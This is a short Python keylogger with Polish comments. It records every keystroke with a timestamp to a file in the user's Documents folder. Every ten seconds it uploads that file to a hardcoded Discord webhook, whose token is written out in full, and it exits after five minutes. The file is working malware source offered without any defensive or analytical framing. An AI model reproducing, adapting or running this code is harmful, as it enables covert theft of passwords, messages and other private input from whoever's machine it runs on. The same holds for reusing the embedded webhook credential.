
import os
import time
import threading
from pynput import keyboard
import requests
import sys
from datetime import datetime

# === Ustawienia ===
WEBHOOK_URL = "https://discord.com/api/webhooks/1360942792540684438/8GkVbhnI8fPO6c8yeYN59KLuNAvCem_-50Bef334UkPn_gMrYMA0DWd3RxyliUPq6R8L"
SEND_INTERVAL = 10  # sekundy
RUN_DURATION = 300  # 5 minut

# === Ścieżka do pliku logów ===
log_file_path = os.path.join(os.path.expanduser("~"), "Documents", "keylog.txt")

# === Bufor naciśnięć ===
key_log = []

def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key}]"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {format_key(key)}\n"
    print(entry)  # Debug!
    key_log.append(entry)

    with open(log_file_path, "a", encoding="utf-8") as f:
        f.writelines(key_log)
        key_log.clear()

def send_log():
    while True:
        time.sleep(SEND_INTERVAL)
        if os.path.exists(log_file_path):
            try:
                with open(log_file_path, "rb") as f:
                    files = {"file": ("keylog.txt", f)}
                    requests.post(WEBHOOK_URL, files=files)
            except Exception as e:
                print(f"Nie udało się wysłać loga: {e}")

def start_keylogger():
    print("Keylogger wystartował")  # Debug!
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    sender_thread = threading.Thread(target=send_log, daemon=True)
    sender_thread.start()

    start_time = time.time()
    while time.time() - start_time < RUN_DURATION:
        time.sleep(1)

    listener.stop()
    sys.exit()

if __name__ == "__main__":
    start_keylogger()
